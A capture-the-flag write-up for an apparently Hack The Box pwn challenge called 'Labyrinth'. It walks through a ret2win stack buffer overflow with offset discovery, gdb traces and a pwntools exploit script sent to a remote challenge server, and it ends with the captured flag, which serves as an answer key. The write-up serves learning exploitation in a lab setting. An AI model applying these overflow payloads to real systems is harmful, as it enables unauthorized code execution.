# Labyrinth
## Description
You find yourself trapped in a mysterious labyrinth, with only one chance to escape. Choose the correct door wisely, for the wrong choice could have deadly consequences.

### Difficulty: easy
---
We are given a labyrinth executable:
```
$ file labyrinth    
labyrinth: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter ./glibc/ld-linux-x86-64.so.2, BuildID[sha1]=86c87230616a87809e53b766b99987df9bf89ad8, for GNU/Linux 3.2.0, not stripped

$ checksec --file=labyrinth
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified   Fortifiable     FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   RW-RUNPATH   83 Symbols        No    0  4labyrinth
```

We see this is a non stripped ELF 64-bit binary, and `checksec`  reveals no canary and no PIE.

Running labyrinth, from the very start, we are given a choice between 100 options:
```
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒-▸        ▒           ▒          ▒
▒-▸        ▒     O     ▒          ▒
▒-▸        ▒    '|'    ▒          ▒
▒-▸        ▒    / \    ▒          ▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒

Select door: 

Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 
Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 
Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 
Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 
Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 
Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 
Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 
Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 
Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 
Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100

>> 1 

[-] YOU FAILED TO ESCAPE!
```

An incorrect answer exits the program. We can try to go through this manually, but we can also find the answer in the file itself:
```
$ cat labyrinth
<..SNIP..>
                                                                                                                   
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                                                                                 
▒-▸        ▒           ▒          ▒                                                                                 
▒-▸        ▒     O     ▒          ▒                                                                                 
▒-▸        ▒    '|'    ▒          ▒                                                                                 
▒-▸        ▒    / \    ▒          ▒                                                                                 
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒                                                                                 
                                                                                                                    
Select door:                                                                                                        
                                                                                                                    
Door: 00%d Door: 0%d Door: %d                                                                                       
>> 69069                                                                                                            
You are heading to open the door but you suddenly see something on the wall:                                        
                                                                                                                    
"Fly like a bird and be free!"                                                                                      
                                                                                                                    
Would you like to change the door you chose?                                                                        
                                                                                                                    
>>
<..SNIP..>
```

We can see `69069`, likely accepting valid answers for both 69 and 069.

```
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒-▸        ▒           ▒          ▒
▒-▸        ▒     O     ▒          ▒
▒-▸        ▒    '|'    ▒          ▒
▒-▸        ▒    / \    ▒          ▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒

Select door: 

Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010 
Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020 
Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030 
Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040 
Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050 
Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060 
Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070 
Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080 
Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090 
Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100 

>> 69

You are heading to open the door but you suddenly see something on the wall:

"Fly like a bird and be free!"

Would you like to change the door you chose?

>> 69

[-] YOU FAILED TO ESCAPE!
```

We progressed one stage, but we are still stuck. Is this second input expecting a number, or something else?
```
Fly like a bird and be free!"

Would you like to change the door you chose?

>> AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[-] YOU FAILED TO ESCAPE!

zsh: segmentation fault  ./labyrinth
```

We reached a segmentation fault, so this might be a target for buffer overflow.

Using Radare2 to find win address:
```
r2 labyrinth                                                                             
 -- º|<|<|  -( glu glu glu, im the r2 fish )
[0x00401140]> aaaa
INFO: Analyze all flags starting with sym. and entry0 (aa)
INFO: Analyze all functions arguments/locals (afva@@@F)
INFO: Analyze function calls (aac)
INFO: Analyze len bytes of instructions for references (aar)
INFO: Finding and parsing C++ vtables (avrr)
INFO: Type matching analysis for all functions (aaft)
INFO: Propagate noreturn information (aanr)
INFO: Scanning for strings constructed in code (/azs)
INFO: Finding function preludes (aap)
INFO: Enable anal.types.constraint for experimental type propagation
[0x00401140]> afl
0x00401140    1     42 entry0
0x00401180    4     31 sym.deregister_tm_clones
0x004011b0    4     49 sym.register_tm_clones
0x004011f0    3     28 sym.__do_global_dtors_aux
0x00401220    1      2 sym.frame_dummy
0x00401670    1      1 sym.__libc_csu_fini
0x00401255    5    208 sym.escape_plan
0x00401030    1      6 sym.imp.putchar
0x00401130    1      6 sym.imp.fwrite
0x004010c0    1      6 sym.imp.fprintf
0x004010f0    1      6 sym.imp.open
0x00401100    1      6 sym.imp.perror
0x00401120    1      6 sym.imp.exit
0x00401090    1      6 sym.imp.fputc
0x004010a0    1      6 sym.imp.read
0x00401080    1      6 sym.imp.close
0x00401674    1      9 sym._fini
0x0040137b    1     51 sym.banner
0x00401050    1      6 sym.imp.puts
0x00401610    4     93 sym.__libc_csu_init
0x00401222    1     51 sym.cls
0x00401060    1      6 sym.imp.printf
0x00401170    1      1 sym._dl_relocate_static_pie
0x00401405   15    510 main
0x00401325    1     86 sym.read_num
0x00401110    1      6 sym.imp.strtoul
0x00401000    3     23 sym._init
0x004013ae    1     87 sym.setup
0x004010e0    1      6 sym.imp.setvbuf
0x00401070    1      6 sym.imp.alarm
0x00401040    1      6 sym.imp.strncmp
0x004010b0    1      6 sym.imp.fgets
0x004010d0    1      6 sym.imp.malloc
```

`sym.escape_plan` looks interesting by name, and the size also suggests there might be a few things going on.

```
pdf @ sym.escape_plan 
┌ 208: sym.escape_plan ();
│           ; var uint32_t fildes @ rbp-0x4
│           ; var void *buf @ rbp-0x5
│           0x00401255      55             push rbp
│           0x00401256      4889e5         mov rbp, rsp
│           0x00401259      4883ec10       sub rsp, 0x10
│           0x0040125d      bf0a000000     mov edi, 0xa                ; int c
│           0x00401262      e8c9fdffff     call sym.imp.putchar        ; int putchar(int c)
│           0x00401267      488b05a22d00.  mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x404010:8]=0                             
│           0x0040126e      4889c1         mov rcx, rax                ; FILE *stream
│           0x00401271      baf0010000     mov edx, 0x1f0              ; 496 ; size_t nitems
│           0x00401276      be01000000     mov esi, 1                  ; size_t size
│           0x0040127b      488d3d960d00.  lea rdi, str.________________O_________________n___________________________________n__________________________________n____n_______________________________n_______________________________n_______________________________n_______________________________n_n ; 0x402018 ; "                \O/               \n                 |                 \n                / \               \n\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592   \u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\n\u2592-\u25b8        \u2592           \u2592          \u2592\n\u2592-\u25b8        \u2592           \u2592          \u2592\n\u2592-\u25b8        \u2592           \u2592          \u2592\n\u2592-\u25b8        \u2592           \u2592          \u2592\n\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\u2592\xe2" ; const void *ptr           
│           0x00401282      e8a9feffff     call sym.imp.fwrite         ; size_t fwrite(const void *ptr, size_t size, size_t nitems, FILE *stream)                                                                                       
│           0x00401287      488b05822d00.  mov rax, qword [obj.stdout] ; obj.__TMC_END__
│                                                                      ; [0x404010:8]=0                             
│           0x0040128e      488d0d740f00.  lea rcx, str.e_0m           ; 0x402209
│           0x00401295      488d15720f00.  lea rdx, str.e_1_32m        ; 0x40220e
│           0x0040129c      488d35750f00.  lea rsi, str._n_sCongratulations_on_escaping__Here_is_a_sacred_spell_to_help_you_continue_your_journey:__s_n ; 0x402218 ; "\n%sCongratulations on escaping! Here is a sacred spell to help you continue your journey: %s\n" ; const char *format                                                                 
│           0x004012a3      4889c7         mov rdi, rax                ; FILE *stream
│           0x004012a6      b800000000     mov eax, 0
│           0x004012ab      e810feffff     call sym.imp.fprintf        ; int fprintf(FILE *stream, const char *format,   ...)                                                                                                           
│           0x004012b0      be00000000     mov esi, 0                  ; int oflag
│           0x004012b5      488d3dba0f00.  lea rdi, str.._flag.txt     ; 0x402276 ; "./flag.txt" ; const char *path
│           0x004012bc      b800000000     mov eax, 0
│           0x004012c1      e82afeffff     call sym.imp.open           ; int open(const char *path, int oflag)
│           0x004012c6      8945fc         mov dword [fildes], eax
│           0x004012c9      837dfc00       cmp dword [fildes], 0
│       ┌─< 0x004012cd      792e           jns 0x4012fd
│       │   0x004012cf      488d3db20f00.  lea rdi, str._nError_opening_flag.txt__please_contact_an_Administrator._n_n ; 0x402288 ; "\nError opening flag.txt, please contact an Administrator.\n\n" ; const char *s                    
<...SNIP...>
```

We can see a victory text at address `0x0040129c`. A little further down we can see actions to open and print the flag.txt. If we can return tho this address, we might be able to produce a victory screen. Firstly, to determine the offset of the overflow:

```
$ /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 300               
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9
```

running in gdb:
```
[----------------------------------registers-----------------------------------]
RAX: 0x0 
RBX: 0x0 
RCX: 0x7ffff7d14a37 (<write+23>:        cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x7fffffffbc20 --> 0x6d31333b315b1b0a 
RDI: 0x7fffffffbb00 --> 0x7ffff7c620d0 (<funlockfile>:  endbr64)
RBP: 0x5f6e726574746170 ('pattern_')
RSP: 0x7fffffffdd78 ("create.rb -")
RIP: 0x401602 (<main+509>:      ret)
R8 : 0x23 ('#')
R9 : 0x7ffff7d7cd70 (mov    r10,QWORD PTR [rsi-0x1b])
R10: 0x20554f59205d2d5b ('[-] YOU ')
R11: 0x246 
R12: 0x7fffffffde88 --> 0x7fffffffe1da ("/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth")
R13: 0x401405 (<main>:  push   rbp)
R14: 0x0 
R15: 0x7ffff7ffd040 --> 0x7ffff7ffe2e0 --> 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x4015f7 <main+498>: call   0x4010c0 <fprintf@plt>
   0x4015fc <main+503>: mov    eax,0x0
   0x401601 <main+508>: leave
=> 0x401602 <main+509>: ret
   0x401603:    cs nop WORD PTR [rax+rax*1+0x0]
   0x40160d:    nop    DWORD PTR [rax]
   0x401610 <__libc_csu_init>:  push   r15
   0x401612 <__libc_csu_init+2>:        lea    r15,[rip+0x2727]        # 0x403d40
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffdd78 ("create.rb -")
0008| 0x7fffffffdd80 --> 0x2d2062 ('b -')
0016| 0x7fffffffdd88 --> 0x401405 (<main>:      push   rbp)
0024| 0x7fffffffdd90 --> 0x100000000 
0032| 0x7fffffffdd98 --> 0x7fffffffde88 --> 0x7fffffffe1da ("/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth")
0040| 0x7fffffffdda0 --> 0x0 
0048| 0x7fffffffdda8 --> 0x78a85a85f5d4e10b 
0056| 0x7fffffffddb0 --> 0x7fffffffde88 --> 0x7fffffffe1da ("/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000401602 in main ()
```
The RBP contains an overflow address `0x6241376241366241`. Calculating offset:
```
$ /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x6241376241366241
[*] Exact match at offset 48
```
Double checking offset:
```
$ python -c 'print("A"*48+"B"*8)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBBBBBB
```
gdb test
```
[----------------------------------registers-----------------------------------]                                    
RAX: 0x0                                                                                                            
RBX: 0x0                                                                                                            
RCX: 0x7ffff7d14a37 (<write+23>:        cmp    rax,0xfffffffffffff000)                                              
RDX: 0x0                                                                                                            
RSI: 0x7fffffffbc20 --> 0x6d31333b315b1b0a                                                                          
RDI: 0x7fffffffbb00 --> 0x7ffff7c620d0 (<funlockfile>:  endbr64)                                                    
RBP: 0x4242424242424242 ('BBBBBBBB')                                                                                
RSP: 0x7fffffffdd80 --> 0x0                                                                                         
RIP: 0x7ffff7c2000a --> 0x1000000000000                                                                             
R8 : 0x23 ('#')                                                                                                     
R9 : 0x7ffff7d7cd70 (mov    r10,QWORD PTR [rsi-0x1b])                                                               
R10: 0x20554f59205d2d5b ('[-] YOU ')                                                                                
R11: 0x246                                                                                                          
R12: 0x7fffffffde88 --> 0x7fffffffe1da ("/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth")             
R13: 0x401405 (<main>:  push   rbp)                                                                                 
R14: 0x0                                                                                                            
R15: 0x7ffff7ffd040 --> 0x7ffff7ffe2e0 --> 0x0                                                                      
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)                                   
[-------------------------------------code-------------------------------------]                                    
   0x7ffff7c20003:      add    BYTE PTR [rax],cl                                                                    
   0x7ffff7c20005:      add    BYTE PTR [rax],al                                                                    
   0x7ffff7c20007:      add    BYTE PTR [rdi+0x7e],dl                                                               
=> 0x7ffff7c2000a:      add    BYTE PTR [rax],al                                                                    
   0x7ffff7c2000c:      add    BYTE PTR [rax],al                                                                    
   0x7ffff7c2000e:      add    BYTE PTR [rax],al                                                                    
   0x7ffff7c20010:      add    DWORD PTR [rax],eax                                                                  
   0x7ffff7c20012:      add    BYTE PTR [rax],al                                                                    
[------------------------------------stack-------------------------------------]                                    
0000| 0x7fffffffdd80 --> 0x0                                                                                        
0008| 0x7fffffffdd88 --> 0x401405 (<main>:      push   rbp)                                                         
0016| 0x7fffffffdd90 --> 0x100000000                                                                                
0024| 0x7fffffffdd98 --> 0x7fffffffde88 --> 0x7fffffffe1da ("/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth")                                                                                                             
0032| 0x7fffffffdda0 --> 0x0                                                                                        
0040| 0x7fffffffdda8 --> 0xb6dc04cf7d4b5e83                                                                         
0048| 0x7fffffffddb0 --> 0x7fffffffde88 --> 0x7fffffffe1da ("/home/kali/Documents/cyber_apocalyse/pwn/challenge/labyrinth")                                                                                                             
0056| 0x7fffffffddb8 --> 0x401405 (<main>:      push   rbp)                                                         
[------------------------------------------------------------------------------]                                    
Legend: code, data, rodata, value                                                                                   
Stopped reason: SIGSEGV                                                                                             
0x00007ffff7c2000a in ?? () from ./glibc/libc.so.6 
```
RBP: 0x4242424242424242 ('BBBBBBBB'). We know our overflow is successful, and now we can put whatever payload for the return function.

First we can try pointing to the start of escape plan:
```
$ python2 -c 'print("69+\n"+"A"*48+"\x55\x12\x40\x00\x00\x00\x00\x00")' | ./labyrinth
<...SNIP...>
Would you like to change the door you chose?

>> 
[-] YOU FAILED TO ESCAPE!

zsh: done                python2 -c 'print("69+\n"+"A"*48+"\x55\x12\x40\x00\x00\x00\x00\x00")' | 
zsh: segmentation fault  ./labyrinth
```
Unfortunately preparing it this way does not work so well. I found a [writeup](https://mregraoncyber.com/rop-emporium-writeup-ret2win/) for a similar ret2win problem that discusses the need for an additional return due in newer Ubuntu versions due to a MOVAPS issue. I'll try this:

```
python2 -c 'print("69+\n"+"A"*48+"\x16\x10\x40\x00\x00\x00\x00\x00"+"\x55\x12\x40\x00\x00\x00\x00\x00")' | ./labyrinth
<...snip...>
Would you like to change the door you chose?

>> 
[-] YOU FAILED TO ESCAPE!


                \O/               
                 |                 
                / \               
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
▒-▸        ▒           ▒          ▒
▒-▸        ▒           ▒          ▒
▒-▸        ▒           ▒          ▒
▒-▸        ▒           ▒          ▒
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒
zsh: done                python2 -c  | 
zsh: segmentation fault  ./labyrinth
```

We have a happy escapee, but we don't see the victory text or our flag. The return seems successful, but our target address isn't quite right? After this step I decided to write a python script that will be able to connect to the remote server and submit our payload. Lastly, after guessing a few addresses within escape_plan, I finally landed on one that works.
```python
from pwn import *

#elf = ELF('labyrinth')

p = remote('167.172.50.208', 30667)

payload = b"A"*48
payload += p64(0x401016)
payload += p64(0x401256)


p.sendline("69")
p.sendline(payload)
p.interactive()

response = p.recvall()
print(re.search("(ROPE{.*?})",response.decode()))
```
Full output from payload:
```
$ python escape.py
[+] Opening connection to 178.62.9.10 on port 31908: Done
/home/kali/Documents/cyber_apocalyse/pwn/challenge/e2.py:12: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline("69")
[*] Switching to interactive mode
                                                                                                                    
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                                                                                 
▒-▸        ▒           ▒          ▒                                                                                 
▒-▸        ▒     O     ▒          ▒                                                                                 
▒-▸        ▒    '|'    ▒          ▒                                                                                 
▒-▸        ▒    / \    ▒          ▒                                                                                 
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒                                                                                 
                                                                                                                    
Select door:                                                                                                        
                                                                                                                    
Door: 001 Door: 002 Door: 003 Door: 004 Door: 005 Door: 006 Door: 007 Door: 008 Door: 009 Door: 010                 
Door: 011 Door: 012 Door: 013 Door: 014 Door: 015 Door: 016 Door: 017 Door: 018 Door: 019 Door: 020                 
Door: 021 Door: 022 Door: 023 Door: 024 Door: 025 Door: 026 Door: 027 Door: 028 Door: 029 Door: 030                 
Door: 031 Door: 032 Door: 033 Door: 034 Door: 035 Door: 036 Door: 037 Door: 038 Door: 039 Door: 040                 
Door: 041 Door: 042 Door: 043 Door: 044 Door: 045 Door: 046 Door: 047 Door: 048 Door: 049 Door: 050                 
Door: 051 Door: 052 Door: 053 Door: 054 Door: 055 Door: 056 Door: 057 Door: 058 Door: 059 Door: 060                 
Door: 061 Door: 062 Door: 063 Door: 064 Door: 065 Door: 066 Door: 067 Door: 068 Door: 069 Door: 070                 
Door: 071 Door: 072 Door: 073 Door: 074 Door: 075 Door: 076 Door: 077 Door: 078 Door: 079 Door: 080                 
Door: 081 Door: 082 Door: 083 Door: 084 Door: 085 Door: 086 Door: 087 Door: 088 Door: 089 Door: 090                 
Door: 091 Door: 092 Door: 093 Door: 094 Door: 095 Door: 096 Door: 097 Door: 098 Door: 099 Door: 100                 
                                                                                                                    
>>                                                                                                                  
You are heading to open the door but you suddenly see something on the wall:

"Fly like a bird and be free!"

Would you like to change the door you chose?

>> 
[-] YOU FAILED TO ESCAPE!                                                                                           
                                                                                                                    
                                                                                                                    
                \O/                                                                                                 
                 |                                                                                                  
                / \                                                                                                 
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒   ▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒                                                                                 
▒-▸        ▒           ▒          ▒                                                                                 
▒-▸        ▒           ▒          ▒                                                                                 
▒-▸        ▒           ▒          ▒                                                                                 
▒-▸        ▒           ▒          ▒                                                                                 
▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▲△▲△▲△▲△▲△▒                                                                                 
                                                                                                                    
Congratulations on escaping! Here is a sacred spell to help you continue your journey: 
HTB{3sc4p3_fr0m_4b0v3}
```
We managed to get the flag, but working out the address ended up as guess-and-check for me.
`HTB{3sc4p3_fr0m_4b0v3}`